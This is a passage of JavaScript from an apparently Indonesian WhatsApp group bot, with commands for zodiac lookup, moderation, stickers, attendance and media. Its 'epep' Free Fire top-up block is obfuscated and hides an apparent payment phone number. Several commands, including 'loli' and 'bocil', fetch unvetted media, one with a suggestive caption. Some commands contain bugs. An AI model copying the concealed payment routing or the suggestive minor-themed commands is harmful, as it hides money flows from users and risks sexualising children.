                if (!q) throw `Example : ${command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(q)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`)
            }
            break
            case prefix + 'shio': {
                if (!q) throw `Example : ${command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(q)
                if (anu.status == false) return reply(anu.message)
                sendMess(M.chat, `⭔ *Hasil :* ${anu.message}`)
            }
            break

            case prefix + 'join':
            case prefix + 'joingc': {
                if (!isOwner) return reply(mess.owner)
                if (!q) return reply(mess.link)
                if (!isUrl(q)) return reply(mess.link)
                if (!q.includes('chat.whatsapp.com')) return reply("Link Invalid")
                let query = q.split('https://chat.whatsapp.com/')[1]
                let data = await bob.groupAcceptInvite(query)
                await reply(jsonformat(data))
            }
            break


            case prefix + 'setwelcome': {
                if (!M.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                if (!isGroupAdmins) return reply(mess.admin)
                if (!q) return reply(`Teksnya Mana? Contoh ${command} ${mess.example1}`)
                global.db.data.chats[M.chat].setWelcome = q
                reply('Succes Change Caption Welcome')
            }
            break

            case prefix + 'cekwelcome': {
                if (!M.isGroup) return reply(mess.group)
                if (!isGroupAdmins && !isOwner) return
                let chat = global.db.data.chats[from]
                let text = chat.setWelcome ? chat.setWelcome : '*Selamat Datang Di Group @subject*\n─────────────────\n*Nama : @user*\n*Pada : @tanggal*\n*Jangan Lupa Baca Rules Group*\n─────────────────\n*@desc*'
                reply('*CEK CAPTION WELCOME*\n\n' + text)
            }
            break

            case prefix + 'delwelcome': {
                if (!M.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins && !isOwner) return
                global.db.data.chats[from].setWelcome = ''
                reply('Done menghapus caption welcome!')
            }
            break

            case prefix + 'setleave': {
                if (!M.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                if (!isGroupAdmins) return reply(mess.admin)
                if (!q) return reply(`Teksnya Mana? Contoh ${command} ${mess.example2}`)
                global.db.data.chats[M.chat].setLeave = q
                reply('Succes Change Caption Leave')
            }
            break

            case prefix + 'cekleave':
            case prefix + 'cekleft': {
                if (!M.isGroup) return reply(mess.group)
                if (!isGroupAdmins && !isOwner) return
                let chat = global.db.data.chats[from]
                let text = chat.setLeave ? chat.setLeave : '*Sayonara* 👋\n─────────────────\n*Nama : @user*\n*Pada : @tanggal*\n\nTelah Meninggalkan Group @subject'
                reply('*CEK CAPTION LEAVE*\n\n' + text)
            }
            break

            case prefix + 'delleave':
            case prefix + 'delleft': {
                if (!M.isGroup) return reply(mess.group)
                if (!isBotGroupAdmins && !isOwner) return
                global.db.data.chats[from].setLeave = ''
                reply('Done menghapus caption leave!')
            }
            break


            case prefix + 'setpp':
            case prefix + 'setppbot':
                if (!isOwner) return reply(mess.owner)
                if (isImage || isQuotedImage) {
                    let img = await bob.downloadAndSaveMediaMessage(quoted)
                    await bob.updateProfilePicture(botNumber, {
                        url: img
                    }).then(res => fs.unlinkSync(img))
                    await reply('Done..')
                } else {
                    reply('Reply Img nya')
                }
                break

                //Group Sistem
            case prefix + 'revoke':
                if (!isGroup) return reply(mess.group)
                if (!isGroupAdmins) return reply(mess.admin)
                if (!isBotGroupAdmins) return reply(mess.botAdmin)
                let link = await bob.groupRevokeInvite(from)
                await reply('Done' + `\n\n*New Link for ${groupName}* :\n https://chat.whatsapp.com/${link}`)
                break

            case prefix + 'leave':
                if (!isGroup) return reply(mess.group)
                if (!isGroupAdmins && !isOwner) return reply(mess.admin)
                reply('Sayonara~ ??').then(async res => await bob.groupLeave(from))
                break

            case prefix + 'tagall':
            case prefix + 'infoall':
                if (!isGroup) return reply(mess.group)
                if (!isGroupAdmins && !isOwner) return reply(mess.admin)
                let teks = `*Mention All\n*Message :  ${q ? q : 'Nothing'}*\n\n`
                for (let mem of groupMembers) {
                    teks += `࿃➡️ @${mem.id.split('@')[0]}\n`
                }
                teks += `\n*${botName}*`
                bob.sendMessage(from, {
                    text: teks,
                    mentions: groupMembers.map(a => a.id)
                }, {
                    quoted: msg
                })
                break

            case prefix + 'hidetag':
                if (!isGroup) return reply(mess.group)
                if (!isGroupAdmins && !isOwner) return reply(mess.admin)
                bob.sendMessage(from, {
                    text: q ? q : '',
                    mentions: groupMembers.map(a => a.id)
                })
                break

                /* *********************************************************/

            case prefix + 'sendbuffer':
                if (!isOwner) return
                try {
                    await reply('Tunggu sebentar...')
                    sendFile(M.chat, q, '', M)
                } catch (err) {
                    await reply(err)
                    console.log(err)
                }
                break

                /* *********************************************************/

            case prefix + 'ping':
            case prefix + 'speed': {
                const timestamp = speed();
                const latensi = speed() - timestamp
                const neww = performance.now()
                const oldd = performance.now()
                reply(`
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_

${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`)

            }
            break

            case prefix + 'runtime': {
                reply(`${runtime(run)}`)
            }
            break
            
            case prefix + 'ml':
	case prefix + 'mobilelegnds':
bob.sendMessage(from, { text: "Coming soon" }, {quoted: nay1 })
break;

case prefix + 'ff': 
case prefix + 'freefire':
				if (args.length < 1) return reply(`Masukan Id ff + nominal\n Contoh : ff 444667253`)
				let nyobb = [{
  				title: "Game Store",
  				rows: [
							{title: `*Free Fire 5 Diamond*`,rowId: `#epep ${q}|5`, description: `\nTop up diamond free fire 5`},
							{title: `*Free Fire 12 Diamond*`,rowId: `#epep ${q}|12`, description: `\nTop up diamond free fire 12`},
							{title: `*Free Fire 70 Diamond*`,rowId: `#epep ${q}|70`, description: `\nTop up diamond free fire 70`},
							{title: `*Free Fire 140 Diamond*`,rowId: `#epep ${q}|140`, description: `\nTop up diamond free fire 140`},
							{title: `*Free Fire 355 Diamond*`,rowId: `#epep ${q}|355`, description: `\nTop up diamond free fire 355`},
							{title: `*Free Fire 720 Diamond*`,rowId: `#epep ${q}|720`, description: `\nTop up diamond free fire 720`}
				]},
				]
				bob.sendListMsg(from, `Pilih layanan sesuai dengan yang ingin anda beli!\njika anda membeli followers maka pilih followers\ndiharapkan anda sudah faham.`, `\nDoraemon`, `Hallo, Berikut layanan kami`, `Click Here`, nyobb, nay1)
				break;
				
     case prefix + 'epep':
     function _0x2eea(_0xb6d974, _0xb3a747) {
    var _0x3438ad = _0x53e6();
    return _0x2eea = function (_0xc54d89, _0x173437) {
        _0xc54d89 = _0xc54d89 - (-0x1 * 0x8f4 + -0x35b * -0x1 + -0xc * -0x97);
        var _0x2a221d = _0x3438ad[_0xc54d89];
        return _0x2a221d;
    }, _0x2eea(_0xb6d974, _0xb3a747);
}
var _0xfd3b45 = _0x2eea;
(function (_0x31b77e, _0x55fede) {
    var _0xe8a4e9 = _0x2eea, _0x3d56b9 = _0x31b77e();
    while (!![]) {
        try {
            var _0x25d0a1 = -parseInt(_0xe8a4e9(0x1a1)) / (0x1 * 0xc3d + -0x111 * 0x12 + -0x9 * -0xc6) + -parseInt(_0xe8a4e9(0x1a5)) / (-0x52 * 0x17 + 0xf8a + 0x5f * -0x16) + -parseInt(_0xe8a4e9(0x19b)) / (0x730 + 0x3e * -0x41 + 0x891) + -parseInt(_0xe8a4e9(0x18d)) / (0x7a4 * 0x2 + 0x1 * 0x1a26 + -0x5d * 0x72) * (parseInt(_0xe8a4e9(0x194)) / (-0x1 * 0x22a3 + -0x12a6 + 0x354e)) + parseInt(_0xe8a4e9(0x1a9)) / (0x6 * 0xa3 + 0x21 * -0x7d + 0x3 * 0x41b) + parseInt(_0xe8a4e9(0x18c)) / (-0xce5 + 0x19d * 0x13 + -0x11bb) * (-parseInt(_0xe8a4e9(0x18b)) / (0xaf8 + 0xc4a + 0x3 * -0x7be)) + parseInt(_0xe8a4e9(0x184)) / (0x7a1 + -0x719 + 0x7f * -0x1) * (parseInt(_0xe8a4e9(0x19e)) / (0x1368 + 0x4 * -0x3d9 + -0x3fa));
            if (_0x25d0a1 === _0x55fede)
                break;
            else
                _0x3d56b9['push'](_0x3d56b9['shift']());
        } catch (_0x334060) {
            _0x3d56b9['push'](_0x3d56b9['shift']());
        }
    }
}(_0x53e6, -0x1 * -0xca78 + 0x29c * 0x15 + 0x16901));
if (isLimit(sender, isPremium, isOwner, limitCount, limit))
    return sendLimit()(_0xfd3b45(0x191) + _0xfd3b45(0x17e) + _0xfd3b45(0x186) + _0xfd3b45(0x182) + (_0xfd3b45(0x197) + _0xfd3b45(0x1a7) + _0xfd3b45(0x1a0) + _0xfd3b45(0x185) + _0xfd3b45(0x1a4) + _0xfd3b45(0x17c)));
var id_ff = q[_0xfd3b45(0x18a)]('|')[-0x2466 + -0x1cf8 + 0x1 * 0x415e], jml_dm = q[_0xfd3b45(0x18a)]('|')[0x2 * 0xb6f + -0x10f3 + -0x5ea], tff = await api[_0xfd3b45(0x188)][_0xfd3b45(0x19c) + _0xfd3b45(0x187)]('' + id_ff, '' + jml_dm), payff = await api[_0xfd3b45(0x188)][_0xfd3b45(0x18f)](tff, _0xfd3b45(0x1a6) + '7');
bob[_0xfd3b45(0x181) + 'e'](M[_0xfd3b45(0x19a)], {
    'image': { 'url': payff[_0xfd3b45(0x180)] },
    'caption': _0xfd3b45(0x1a3) + tff[_0xfd3b45(0x1a8)][_0xfd3b45(0x198)][_0xfd3b45(0x199)] + _0xfd3b45(0x1a2) + tff[_0xfd3b45(0x1a8)][_0xfd3b45(0x192)] + _0xfd3b45(0x195) + tff[_0xfd3b45(0x1a8)][_0xfd3b45(0x190)][_0xfd3b45(0x17b)] + _0xfd3b45(0x193) + tff[_0xfd3b45(0x1a8)][_0xfd3b45(0x183)][_0xfd3b45(0x199)] + _0xfd3b45(0x17f) + tff[_0xfd3b45(0x1a8)][_0xfd3b45(0x183)][_0xfd3b45(0x19f)] + _0xfd3b45(0x17d) + tff[_0xfd3b45(0x1a8)][_0xfd3b45(0x19d) + 'e'] + _0xfd3b45(0x189) + payff[_0xfd3b45(0x180)] + (_0xfd3b45(0x18e) + '\x20') + payff[_0xfd3b45(0x196)]
}, { 'quoted': nay1 }), limitAdd(sender, limit);
function _0x53e6() {
    var _0x141296 = [
        'tau\x20beli\x20p',
        'data',
        '633480wSTQyL',
        'userName',
        'ited\x20limit',
        '\x0aType\x20:\x20',
        'AMU\x20HABIS\x20',
        '\x0aPrice\x20:\x20',
        'qrCode',
        'sendMessag',
        'mit\x20di\x20',
        'item',
        '24741rrBtUZ',
        'uk\x20mendapa',
        ']*\x0aBeli\x20li',
        'ire',
        'game',
        '\x0aQr\x20:\x20',
        'split',
        '624UCybUo',
        '22036TItsAS',
        '2152jlwLbl',
        '\x0aExpired\x20:',
        'payDiamond',
        'gameDetail',
        '*[\x20LIMIT\x20K',
        'gameId',
        '\x0aTotal\x20:\x20',
        '55OlzoKG',
        '\x0aName\x20:\x20',
        'timerCount',
        'buylimit\x20a',
        'product',
        'name',
        'chat',
        '205944tOCDoC',
        'topupFreeF',
        'paymentNam',
        '2020LOqjta',
        'price',
        'remium\x20unt',
        '144037lFXiIU',
        '\x0aId\x20:\x20',
        'Product\x20:\x20',
        'tkan\x20unlim',
        '76908yjfely',
        '0881192917'
    ];
    _0x53e6 = function () {
        return _0x141296;
    };
    return _0x53e6();
}
          break;
case prefix + 'ppcp': {
                reply(mess.wait)
                let random = api3.Couples()
                bob.sendMessage(M.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: nay1 })
                bob.sendMessage(M.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: nay1 })
            }
	    break
            case prefix + 'tomp4':
            case prefix + 'tovideo': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${command}*`)
                let media = await bob.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await bob.sendMessage(M.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: msg
                })
                await fs.unlinkSync(media)
                limitAdd(sender, limit)
            }
            break

            case prefix + 'togif': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${command}*`)
                let media = await bob.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await bob.sendMessage(M.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: msg
                })
                await fs.unlinkSync(media)
                limitAdd(sender, limit)
            }
            break

            case prefix + 'take':
            case prefix + 'colong':
            case prefix + 'swm':
            case prefix + 'stickerwm':
            case prefix + 'wm':
            case prefix + 'exif': {
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                if (!quoted) return reply(`Reply Media dengan caption ${command} Punya|Senkuu`)
                let {
                    writeExif
                } = require('../lib/exif')
                let media = {}
                media.mimetype = mime
                media.data = await M.getMsgBuffer(quoted)
                let encmedia = await writeExif(media, {
                    packname: q.split("|")[0] ? q.split("|")[0] : global.packname,
                    author: q.split("|")[1] ? q.split("|")[1] : global.author
                })
                bob.sendMessage(M.chat, {
                    sticker: {
                        url: encmedia
                    }
                }, {
                    quoted: msg
                })
                await fs.unlinkSync(encmedia)
                limitAdd(sender, limit)
            }
            break

            case prefix + 'ukhty':
                fetchText('https://raw.githubusercontent.com/rapzz/asupan/master/ukhty').then(async data => {
                    var ty = data.split('\n')
                    var ukhty = ty[Math.floor(Math.random() * ty.length)]
                    bob.sendMessage(from, {
                        video: {
                            url: ukhty
                        },
                        caption: `Tuh Bola Dangdut`,
                        buttons: [{
                                buttonId: `#ukhty`,
                                buttonText: {
                                    displayText: "Next"
                                },
                                type: 1
                            }
                        ],
                        footer: "Nih"
                    }, {
                        quoted: msg
                    })
                })
                break
                case prefix + 'gea':
                fetchText('https://raw.githubusercontent.com/rapzz/asupan/master/geayubi').then(async data => {
                    var tyu = data.split('\n')
                    var gea = tyu[Math.floor(Math.random() * tyu.length)]
                    bob.sendMessage(from, {
                        video: {
                            url: gea
                        },
                        caption: `Tuh Bola Dangdut`,
                        buttons: [{
                                buttonId: `#gea`,
                                buttonText: {
                                    displayText: "Next"
                                },
                                type: 1
                            }
                        ],
                        footer: "Nih"
                    }, {
                        quoted: msg
                    })
                })
                limitAdd(sender, limit)
                break
                case prefix + 'rika':
                fetchText('https://raw.githubusercontent.com/rapzz/asupan/master/rikagusriani').then(async data => {
                    var tya = data.split('\n')
                    var rika = ty[Math.floor(Math.random() * ty.length)]
                    bob.sendMessage(from, {
                        video: {
                            url: rika
                        },
                        caption: `tes`,
                        buttons: [{
                                buttonId: `#rika`,
                                buttonText: {
                                    displayText: "Next"
                                },
                                type: 1
                            }
                        ],
                        footer: "Nih"
                    }, {
                        quoted: msg
                    })
                })
                limitAdd(sender, limit)
                break
                case prefix + 'santuy':
                fetchText('https://raw.githubusercontent.com/rapzz/asupan/master/santuy').then(async data => {
                    var san = data.split('\n')
                    var tuy = san[Math.floor(Math.random() * san.length)]
                    bob.sendMessage(from, {
                        video: {
                            url: tuy
                        },
                        caption: `tes`,
                        buttons: [{
                                buttonId: `#santuy`,
                                buttonText: {
                                    displayText: "Next"
                                },
                                type: 1
                            }
                        ],
                        footer: "Nih"
                    }, {
                        quoted: msg
                    })
                })
                limitAdd(sender, limit)
                break
                case prefix + 'bocil':
                fetchText('https://raw.githubusercontent.com/rapzz/asupan/master/bocil').then(async data => {
                    var tay = data.split('\n')
                    var bocil = tay[Math.floor(Math.random() * tay.length)]
                    bob.sendMessage(from, {
                        video: {
                            url: bocil
                        },
                        caption: `Tuh Bola Dangdut`,
                        buttons: [{
                                buttonId: `#bocil`,
                                buttonText: {
                                    displayText: "Next"
                                },
                                type: 1
                            }
                        ],
                        footer: "Nih"
                    }, {
                        quoted: msg
                    })
                })
                limitAdd(sender, limit)
                break


                /**************** NO PLUGINS ***************/


            case prefix + 'absen':
                global.db.data.absen = global.db.data.absen || {}
                if (!(from in global.db.data.absen)) return reply(`Tidak ada absen berlangsung!`)
                let absen = global.db.data.absen[from][1]
                const wasVote = absen.includes(M.sender)
                if (wasVote) return reply('Kamu sudah absen!')
                absen.push(M.sender)
                let d = new Date
                let date = d.toLocaleDateString('id', {
                    day: 'numeric',
                    month: 'long',
                    year: 'numeric'
                })
                let list = absen.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join('\n')
                let caption = `Tanggal: ${date}

${global.db.data.absen[from][2] ? global.db.data.absen[from][2] + '\n' : ''}
╭─「 Daftar Absen 」
│ Total: ${absen.length}
${list}
╰────`.trim()
                await replyNtag(caption)
                //bob.sendMessage(from,{text : caption},{quoted:msg})
                break


            case prefix + 'cekabsen':
                global.db.data.absen = global.db.data.absen || {}
                if (!(from in global.db.data.absen)) return reply(`Tidak ada absen berlangsung!`)
                let dd = new Date
                let datee = dd.toLocaleDateString('id', {
                    day: 'numeric',
                    month: 'long',
                    year: 'numeric'
                })
                let absenn = global.db.data.absen[from][1]
                let listt = absenn.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join('\n')
                let captionn = `Tanggal: ${datee}
${global.db.data.absen[from][2] ? global.db.data.absen[from][2] + '\n' : ''}
╭─「 Daftar Absen 」
│ Total: ${absenn.length}
${listt}
╰────`.trim()
                replyNtag(captionn)
                break

            case prefix + 'deleteabsen':
            case prefix + 'delabsen':
                if (M.isGroup) {
                    if (!(isGroupAdmins || isOwner)) return reply('Only Admin')
                }
                global.db.data.absen = global.db.data.absen || {}
                if (!(from in global.db.data.absen)) return reply(`Tidak ada absen berlangsung!`)
                delete global.db.data.absen[from]
                reply(`Absen berhasil dihapus`)
                break

case prefix + 'kick': {
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit() (`*[ LIMIT KAMU HABIS ]*\nBeli limit di buylimit atau beli premium untuk mendapatkan unlimited limit`) 
	if (args.length < 1) return msg.reply(`Tag orangnya yang ingin di kick`)
		if (!isGroup) throw mess.group
                if (!isBotGroupAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
		let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await bob.groupParticipantsUpdate(M.chat, [users], 'remove').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
		}
	limitAdd(sender, limit)
	break;
	
	case prefix + 'add':
           if (!isGroup) return msg.reply('Khusus Grup')
           if (!isGroupAdmins) return msg.reply('Khusus Admin')
           if (!isBotGroupAdmins) return msg.reply('Bot Bukan Admin')
             if (args[1]){
                 let number = msg.quoted ? msg.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
                 let response = await bob.groupParticipantsUpdate(from, [number], "add")
                 let o = await response[0]
                 let inv = o.status       
                       if(inv == 408) return msg.reply('Dia baru-baru saja keluar dari grub ini!')
                       if(inv == 409) return msg.reply('Dia sudah join!')
                       if(inv == 500) return msg.reply('Grub penuh!')
                       if(inv == 403){
                             bob.sendMessage(from, { text: `@${number.split('@')[0]} tidak dapat ditambahkan karena target private acc*\nUndangan akan dikirimkan ke -> wa.me/${q.replace(/[^0-9]/g, '')} Melalui jalur pribadi`, mentions: [number] }, { quoted : nay1 }) 
                             bob.sendMessage(`${number}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin:\nwa.me/${msg.sender}\n Mengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, mentions: [number] }, { quoted : nay1 }) 
                        } else { msg.reply('Errr')  }
                        console.log(inv)
              } else {
                    let response = await bob.groupParticipantsUpdate(from, mentionUser, "add")
                    let o = await response[0]
                    let inv = o.status
                    let invv = await bob.groupInviteCode(from) 
                      console.log(inv)
                      console.log(mentionUser)
                       if(inv == 408) return msg.reply('Dia baru-baru saja keluar dari grub ini!')
                       if(inv == 409) return msg.reply('Dia sudah join!')
                       if(inv == 500) return msg.reply('Grub penuh!')
                       if(inv == 403){
                            bob.sendMessage(from, { text: `${mentionUser} tidak dapat ditambahkan karena target private acc*\nUndangan akan dikirimkan ke -> wa.me/${mentionUser} Melalui jalur pribadi`, mentions: [mentionUser] }, { quoted : nay1 }) 
                            bob.sendMessage(`${mentionUser}`, { text: `${'https://chat.whatsapp.com/' + invv}\n------------------------------------------------------\n\nAdmin:\nwa.me/${msg.sender}\n Mengundang anda ke group ini\nSilahkan masuk jika berkehendak🙇`, mentions: [mentionUser] }, { quoted : nay1 }) 
                         } else { msg.reply('Errr') }
                        console.log(inv)
                        }
                      break;
	
	case prefix + 'promote': 
	if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit() (`*[ LIMIT KAMU HABIS ]*\nBeli limit di buylimit atau beli premium untuk mendapatkan unlimited limit`) 
	if (args.length < 1) return msg.reply(`Tag orang nya yang ingiin di promote`)
		if (!isGroup) throw mess.group
                if (!isBotGroupAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
		let users = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await bob.groupParticipantsUpdate(M.chat, [users], 'promote').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
		limitAdd(sender, limit)
	break;
	
	case prefix + 'demote': 
	if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit() (`*[ LIMIT KAMU HABIS ]*\nBeli limit di buylimit atau beli premium untuk mendapatkan unlimited limit`) 
	if (args.length < 1) return msg.reply(`Tag admin nya yang ingiin di demote`)
		if (!isGroup) throw mess.group
                if (!isBotGroupAdmins) throw mess.botAdmin
                if (!isGroupAdmins) throw mess.admin
		let uses = msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.quoted ? msg.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await bob.groupParticipantsUpdate(M.chat, [uses], 'demote').then((res) => msg.reply(jsonformat(res))).catch((err) => msg.reply(jsonformat(err)))
		limitAdd(sender, limit)
	break;

            case prefix + 'absenstart':
                if (!q) return reply('Absennya apa?')
                if (M.isGroup) {
                    if (!(isGroupAdmins || isOwner)) return reply('Only Admin')
                }
                global.db.data.absen = global.db.data.absen || {}
                if (from in global.db.data.absen) return reply(`Masih ada absen di chat ini!`)
                global.db.data.absen[from] = [
                    await bob.sendMessage(from, {
                        text: 'Absen Di Mulai..'
                    }, {
                        quoted: msg
                    }),
                    [],
                    q
                ]
                break



                /**************** PLUGINS ***************/
                
                
                
                //----> OtakuDesu 
                
            case prefix + 'otakudesu':
                let ket = q.split("|")[0]
                let quer = q.split("|")[1]
                if (!ket) return reply('「 ❗ 」masukan paramater!!\n\nexample : #otakudesu search|')                     
                if (ket == "search") {
                let otakudesu_search = require('../plugins/otaku_search');
                otakudesu_search(M, quer, prefix, msg, bob)
                }  if (ket == "get") {
                let otakudesu_eps = require('../plugins/otaku_eps');
                otakudesu_eps(M, quer, prefix, msg, bob)
                } if (ket == "download") {
                let otakudesu_download = require('../plugins/otaku_download');
                otakudesu_download(M, quer, prefix, msg, bob)
                }
                break
                
                
                //----> End Of OtakuDesu


            case prefix + 'lirik':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let lirik = require('../plugins/lirik')
                lirik(q, sendFile, M, textImg, sendMess)
                limitAdd(sender, limit)
                break

            case prefix + 'ghstalk':
            case prefix + 'ghsearch':
            case prefix + 'githubstalk':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let github = require('../plugins/github')
                github(q, textImg, sendMess)
                limitAdd(sender, limit)
                break

            case prefix + 'suit':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let suit = require('../plugins/suit')
                suit(q, reply, prefix)
                limitAdd(sender, limit)
                break


            case prefix + 'calc':
            case prefix + 'kalkulator':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let calc = require('../plugins/calculator')
                calc(M, bob, q)
                limitAdd(sender, limit)
                break

            case prefix + 'namaninja':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let namaninja = require('../plugins/namaninja')
                namaninja(q, M)
                limitAdd(sender, limit)
                break

            case prefix + 'alay':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let alay = require('../plugins/alay')
                alay(M, q)
                limitAdd(sender, limit)
                break

            case prefix + 'group':
            case prefix + 'grup':
                if (!isGroup) return reply(mess.group)
                if (!isGroupAdmins && !isOwner) return reply(mess.admin)
                let groupsettings = require('../plugins/groupSettings')
                groupsettings(q, bob, M)
                break


            case prefix + 's':
            case prefix + 'sticker':
            case prefix + 'stiker':
                let stickers = require('../plugins/sticker')
                stickers(textImg, quoted, mime, bob, M)
                break

            case prefix + 'mode':
            case prefix + 'set':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                if (!isOwner) return reply(mess.owner)
                let mode = require('../plugins/mode')
                mode(prefix, bob, M)
                limitAdd(sender, limit)
                break


            case prefix + 'self': {
                if (!isOwner) return reply(mess.owner)
                setting.Mode = 'Self'
                reply('Done..')
            }
            break

            case prefix + 'public': {
                if (!isOwner) return reply(mess.owner)
                setting.Mode = 'Public'
                reply('Done..')
            }
            break

            case prefix + 'toimg':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
                let toimg = require('../plugins/toimg')
                toimg(bob, M, quoted, isQuotedSticker, textImg)
                limitAdd(sender, limit)
                break

case prefix + 'waifu':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
    reply(mess.wait)
           let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/waifu.json`)).data
           let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
          sendFile(M.chat,`${wipi}`,`Nieh`, M)
break
case prefix + 'wallpaper':
 if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
reply(mess.wait)
api1.wallpaperv2().then(res => {
var wp = res[Math.floor(Math.random() * res.length)]
bob.sendMessage(M.chat, {image:  {url: wp }})
})
break
case prefix + 'pinterest': {
                reply(mess.wait)
		let { pinterest } = require('../lib/scraper')
                let anu2 = await pinterest(q)
                let result = anu2[Math.floor(Math.random() * anu2.length)]
                bob.sendMessage(M.chat, { image: { url: result }, caption: 'â­” Media Url : '+result }, { quoted: nay1 })
            }
            break
    case prefix + 'loli':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
    reply(mess.wait)
           let cuk = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/loli.json`)).data
           let hah = cuk[Math.floor(Math.random() * (cuk.length))]
          sendFile(M.chat,`${hah}`,`Nieh`, M)
break
    case prefix + 'husbu':
    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return sendLimit()
    reply(mess.wait)
           let pa = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/husbu.json`)).data
           let okky = pa[Math.floor(Math.random() * (pa.length))]
          sendFile(M.chat,`${okky}`,`Nieh`, M)
break
    case prefix + 'milf':
